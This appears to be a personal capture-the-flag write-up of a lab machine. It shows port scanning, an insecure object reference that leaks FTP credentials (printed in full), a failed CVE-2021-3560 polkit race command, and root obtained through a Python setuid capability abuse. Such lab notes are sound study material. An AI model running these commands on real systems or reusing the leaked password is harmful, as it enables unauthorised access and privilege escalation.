---
tags:
banner:
publish: false
---
```
nmap -p- -sV -sC 10.129.7.106
```

Port 21: ftp - vsftpd 3.0.3

port 22: ssh - OpenSSH 8.2p1 Ubuntu

port 80: http - Gunicorn server


# Http server
Gobuster did not show subdirectories i couldnt find by clicking around.

ffuf also did not find any other subdirectories


one page shows ip config

one page shows netstat

one page shows a table with network stuffs, changing the url to `/data/0` gives me the admin user’s network request history. 

Login credentials to FTP:
- USER: `nathan`
- PASS Buck3tH4TF0RM3!

# FTP server
ftp nathan@10.129.7.106

user flag in starting directory.

# SSH server
same login credentials as ftp

using [linpeas](https://www.kali.org/tools/peass-ng/) to privilege escalate enumerate.

copying the `linpeas.sh` file to the server and running it.

`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`.

Says its vulnerable to [cve-2021-3560](https://access.redhat.com/security/cve/cve-2021-3560).

using an explenation to try and exploit the vulnerability.
https://www.vicarius.io/vsociety/posts/polkit-root-privilege-access-vulnerability-cve-2021-3560

Basically, you run a dbus command (like with systemctl or something) that has elevated permissions, but you kill the process before the polkit agent can ask you for credentials (the command will still be ran, for some reason)

First, time the command and see how long it runs
```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hello string:"L Bozo" int32:1
```

it takes about 0.008 seconds, or 8 milliseconds. so we kill it after about 4.

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:hello string:"L Bozo" int32:1 & sleep 0.004s; kill $!
```

doesn’t work, for some reason.

python has the rights to set user id of its own process, somehow.

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

yay
